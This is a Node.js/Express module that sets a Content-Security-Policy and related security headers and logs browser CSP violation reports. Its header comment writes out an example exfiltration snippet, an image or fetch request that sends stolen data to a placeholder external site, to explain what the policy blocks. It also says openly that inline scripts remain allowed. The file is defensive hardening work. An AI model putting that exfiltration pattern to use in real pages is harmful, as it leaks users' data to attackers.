'use strict';

// 浏览器安全策略（Content-Security-Policy）+ 违规上报（2026-11-14）。
//
// 🔴 为什么要有：注入进页面的代码偷数据，靠的几乎都是
//    `new Image().src = 'https://外站/…?d=底牌'` 或 `fetch('https://外站/…')` 把数据送出去的。
//    这里规定「图片、网络请求只准走本站」之后，同样的代码就算混进页面，数据也送不出去。
//    它是第二道防线：第一道是「拼进 HTML 的数据一律转义」（tools/check-escape.js）。
//
// ⚠️ 已知的妥协：script-src 还带着 'unsafe-inline'。
//    页面里有几百处 onclick="…" 内联事件，去掉它整个界面就点不动了。
//    所以这条策略挡的是「把数据偷偷送到外站」，挡不住「在页面里执行代码」——
//    后者靠转义。以后把内联事件都改成 addEventListener，就能把 'unsafe-inline' 拿掉。
//
// 页面今天不加载任何外站资源（字体、音效、头像、socket.io 全是本站的），
// 所以除了 data:/blob:（牌背 SVG、语音回放）以外一律只放行 'self'。

// 只接受正常的主机名（含端口）。Host 头是客户端发的，别把奇怪的东西拼进响应头。
const HOST_RE = /^[a-z0-9.-]+(?::\d{1,5})?$/i;

function contentSecurityPolicy(host) {
    // 'self' 在新浏览器里已经包含同源的 ws/wss，但老一点的 Safari 不认 ——
    // 所以把【本站】的 ws/wss 显式写上。绝不能写成裸的 `wss:`：那等于放行任何站点的 websocket。
    const sockets = host && HOST_RE.test(host) ? ` wss://${host} ws://${host}` : '';
    return [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: blob:",
        "media-src 'self' blob:",
        "font-src 'self'",
        `connect-src 'self'${sockets}`,
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'none'",
        'report-uri /api/csp-report',
    ].join('; ');
}

function registerSecurityHeaders({ app, express, clientErrors, extractIp }) {
    app.use((req, res, next) => {
        res.setHeader('Content-Security-Policy', contentSecurityPolicy(req.headers.host));
        res.setHeader('X-Content-Type-Options', 'nosniff');
        res.setHeader('Referrer-Policy', 'same-origin');
        next();
    });

    // 浏览器拦下一次违规就会往这里报一条。有人试的话会被记下来 ——
    // 这次要是再有人试，管理面板「客户端报错」里会直接看到「CSP 拦截 → 某个外站地址」。
    // 和 /api/client-error 一样不鉴权、按敌对输入处理（限流 / 去重 / 截断都在 clientErrors 里）。
    const parseReport = express.json({ limit: '16kb', type: ['application/csp-report', 'application/json', 'application/reports+json'] });
    app.post('/api/csp-report', (req, res, next) => {
        parseReport(req, res, err => (err ? res.status(204).end() : next()));
    }, (req, res) => {
        const r = req.body?.['csp-report'] || req.body?.[0]?.body || req.body || {};
        const directive = r['violated-directive'] || r['effective-directive'] || r.effectiveDirective || '?';
        const blocked = r['blocked-uri'] || r.blockedURL || '?';
        clientErrors.record({
            kind: 'csp',
            message: `CSP 拦截 ${directive} → ${blocked}`,
            source: r['source-file'] || r.sourceFile || '',
            line: r['line-number'] || r.lineNumber || 0,
            page: r['document-uri'] || r.documentURL || '',
        }, { ip: extractIp(req.headers, req.socket?.remoteAddress) || '?' });
        res.status(204).end();
    });
}

module.exports = { registerSecurityHeaders, contentSecurityPolicy };
